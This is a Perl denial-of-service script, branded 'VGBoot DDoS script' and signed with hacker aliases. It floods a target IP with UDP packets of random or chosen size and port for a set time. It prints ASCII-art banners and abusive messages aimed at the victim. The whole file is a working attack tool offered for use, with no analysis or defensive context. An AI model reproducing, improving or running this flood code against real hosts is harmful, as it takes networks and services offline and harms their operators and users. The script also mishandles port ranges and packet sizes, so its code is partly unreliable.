#!/usr/bin/perl
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

print BOLD RED "IP first";
print BOLD YELLOW "port Second\n";
print BOLD GREEN "packets third";
print BOLD BLACK  "seconds last\n";
 
############
# Monarch<----
############
 
use Socket;
use strict;
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);
 
print BOLD GREEN<<EOTEXT;
||'  '|' '||''|.   '||''|.         IP: $ip
||    |   ||   ||   ||   ||      PORT: $port
||    |   ||    ||  ||...|'   PACKETS: $size
||    |   ||    ||  ||           TIME: $time
 '|..'   .||...|'  .||.
DDoS GoD By Vinix G YoU JuSt HiT $ip with $size packets.
-VGBoot DDoS script.
By: xxjasontpikexx AKA DEEP-WEB (GHOST HACKER)                 
       
EOTEXT
 
use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;
print "~ FuCk YoU~ $ip " . ($port ? $port : "random") . "-" .
  ($size ? "$size-byte" : "Get Null Routed Bitch!?") . "
~ DDoSing $ip.
~ #OffLine ~ " .
  ($time ? " for $time seconds" : "") . "\n";
print "Break with Ctrl-C\n" unless $time;  
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1500000-64)+64) ;
  $pport = $port ? $port : int(rand(1500000))+1;
 
send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport,
 $iaddr));}
